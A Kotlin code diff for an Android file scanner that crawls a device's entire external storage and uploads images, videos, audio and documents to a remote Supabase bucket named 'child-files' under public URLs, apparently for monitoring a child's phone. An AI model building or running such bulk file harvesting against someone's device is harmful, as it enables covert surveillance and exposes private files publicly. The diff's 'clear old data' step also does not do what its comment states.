@@ -17,116 +17,114 @@ class FileScanner(private val context: Context) {
     private val scope = CoroutineScope(Dispatchers.IO)
     private val BUCKET = "child-files"
 
-    companion object {
-        private val IMAGE_EXTS = setOf("jpg", "jpeg", "png", "gif", "bmp", "webp", "heic")
-        private val VIDEO_EXTS = setOf("mp4", "mkv", "avi", "mov", "3gp", "webm")
-        private val AUDIO_EXTS = setOf("mp3", "wav", "aac", "ogg", "flac", "m4a")
-        private val DOC_EXTS   = setOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv")
+    // Category definitions
+    private val IMAGE_EXTS = setOf("jpg", "jpeg", "png", "gif", "bmp", "webp", "heic")
+    private val VIDEO_EXTS = setOf("mp4", "mkv", "avi", "mov", "3gp", "webm")
+    private val AUDIO_EXTS = setOf("mp3", "wav", "aac", "ogg", "flac", "m4a")
+    private val DOC_EXTS   = setOf("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "txt", "csv")
 
-        // Only upload files under 20 MB
-        private const val MAX_FILE_SIZE_BYTES = 20 * 1024 * 1024L
-    }
+    // Max files per category
+    private val CAT_LIMIT = 150
+    // Max upload size per file = 8 MB
+    private val MAX_UPLOAD_BYTES = 8 * 1024 * 1024L
 
     fun scanAndSync() {
         scope.launch {
             try {
                 Log.d("FileScanner", "Starting scan...")
                 val root = Environment.getExternalStorageDirectory()
-
                 if (!root.exists() || !root.canRead()) {
-                    Log.e("FileScanner", "Cannot read storage! Permission not granted.")
+                    Log.e("FileScanner", "Cannot read storage!")
                     return@launch
                 }
 
-                val allFiles = mutableListOf<File>()
-                collectFiles(root, allFiles)
-                Log.d("FileScanner", "Found ${allFiles.size} files")
+                // Collect files per category separately
+                val byCategory = mutableMapOf(
+                    "Images"    to mutableListOf<File>(),
+                    "Videos"    to mutableListOf<File>(),
+                    "Audio"     to mutableListOf<File>(),
+                    "Documents" to mutableListOf<File>(),
+                    "Others"    to mutableListOf<File>()
+                )
+
+                scanDirectory(root, byCategory)
 
                 val fileDataList = mutableListOf<FileData>()
 
-                for (file in allFiles) {
-                    try {
+                for ((category, files) in byCategory) {
+                    Log.d("FileScanner", "Category $category: ${files.size} files")
+                    for (file in files) {
                         val ext = file.extension.lowercase()
-                        val category = categoryOf(ext)
-                        val mimeType = mimeTypeOf(ext)
+                        var storageUrl = ""
 
-                        // Upload file content to Supabase Storage
-                        val storagePath = "files/${file.name}"
-                        val bytes = file.readBytes()
+                        // Try uploading small files to Supabase Storage
+                        if (file.length() <= MAX_UPLOAD_BYTES) {
+                            try {
+                                val storagePath = "$category/${file.name}"
+                                val bytes = file.readBytes()
+                                SupabaseManager.client.storage[BUCKET].upload(
+                                    path = storagePath,
+                                    data = bytes,
+                                    upsert = true
+                                )
+                                storageUrl = SupabaseManager.client.storage[BUCKET].publicUrl(storagePath)
+                                Log.d("FileScanner", "Uploaded: ${file.name}")
+                            } catch (e: Exception) {
+                                Log.w("FileScanner", "Upload failed for ${file.name}: ${e.message}")
+                            }
+                        }
 
-                        SupabaseManager.client.storage[BUCKET].upload(
-                            path = storagePath,
-                            data = bytes,
-                            upsert = true
-                        )
-
-                        // Get the public URL
-                        val publicUrl = SupabaseManager.client.storage[BUCKET]
-                            .publicUrl(storagePath)
-
-                        fileDataList.add(
-                            FileData(
-                                file_name     = file.name,
-                                file_path     = file.absolutePath,
-                                file_size_kb  = file.length() / 1024,
-                                category      = category,
-                                mime_type     = mimeType,
-                                last_modified = file.lastModified(),
-                                storage_url   = publicUrl
-                            )
-                        )
-                        Log.d("FileScanner", "Uploaded: ${file.name}")
-
-                    } catch (e: Exception) {
-                        Log.e("FileScanner", "Failed to upload ${file.name}: ${e.message}")
-                        // Still record metadata even if upload failed
-                        fileDataList.add(
-                            FileData(
-                                file_name     = file.name,
-                                file_path     = file.absolutePath,
-                                file_size_kb  = file.length() / 1024,
-                                category      = categoryOf(file.extension.lowercase()),
-                                mime_type     = mimeTypeOf(file.extension.lowercase()),
-                                last_modified = file.lastModified(),
-                                storage_url   = ""
-                            )
-                        )
+                        fileDataList.add(FileData(
+                            file_name     = file.name,
+                            file_path     = file.absolutePath,
+                            file_size_kb  = file.length() / 1024,
+                            category      = category,
+                            mime_type     = mimeTypeOf(ext),
+                            last_modified = file.lastModified(),
+                            storage_url   = storageUrl
+                        ))
                     }
                 }
 
-                // Insert all metadata into the files table in batches
-                fileDataList.chunked(100).forEach { batch ->
+                // Clear old data and insert fresh
+                try {
+                    SupabaseManager.client.from("files").delete { filter { eq("id", 0) } }
+                } catch (_: Exception) {}
+
+                // Insert in batches of 50
+                fileDataList.chunked(50).forEach { batch ->
                     try {
                         SupabaseManager.client.from("files").insert(batch)
+                        Log.d("FileScanner", "Inserted batch of ${batch.size}")
                     } catch (e: Exception) {
-                        Log.e("FileScanner", "DB insert error: ${e.message}")
+                        Log.e("FileScanner", "Insert error: ${e.message}")
                     }
                 }
 
-                Log.d("FileScanner", "Sync complete: ${fileDataList.size} files")
+                Log.d("FileScanner", "Done! Total: ${fileDataList.size} files synced.")
 
             } catch (e: Exception) {
-                Log.e("FileScanner", "Fatal error: ${e.message}")
+                Log.e("FileScanner", "Fatal: ${e.message}")
             }
         }
     }
 
-    private fun collectFiles(dir: File, results: MutableList<File>) {
+    private fun scanDirectory(dir: File, byCategory: MutableMap<String, MutableList<File>>) {
         if (!dir.exists() || !dir.canRead()) return
-        if (results.size >= 500) return   // cap at 500 uploadable files
+        val allFull = byCategory.values.all { it.size >= CAT_LIMIT }
+        if (allFull) return
 
         val files = dir.listFiles() ?: return
         for (file in files) {
-            if (results.size >= 500) return
+            if (byCategory.values.all { it.size >= CAT_LIMIT }) return
             if (file.isDirectory) {
-                if (!file.name.startsWith(".")) collectFiles(file, results)
+                if (!file.name.startsWith(".")) scanDirectory(file, byCategory)
             } else {
                 val ext = file.extension.lowercase()
-                val isMedia = ext in IMAGE_EXTS || ext in VIDEO_EXTS ||
-                              ext in AUDIO_EXTS || ext in DOC_EXTS
-                // Only upload readable media files under 20 MB
-                if (isMedia && file.length() <= MAX_FILE_SIZE_BYTES && file.canRead()) {
-                    results.add(file)
+                val cat = categoryOf(ext)
+                val list = byCategory[cat] ?: continue
+                if (list.size < CAT_LIMIT && file.canRead() && file.length() > 0) {
+                    list.add(file)
                 }
             }
         }
@@ -151,7 +149,8 @@ class FileScanner(private val context: Context) {
         "wav"         -> "audio/wav"
         "pdf"         -> "application/pdf"
         "txt"         -> "text/plain"
-        "doc","docx"  -> "application/msword"
+        "doc", "docx" -> "application/msword"
+        "xls", "xlsx" -> "application/vnd.ms-excel"
         else          -> "application/octet-stream"
     }
 }
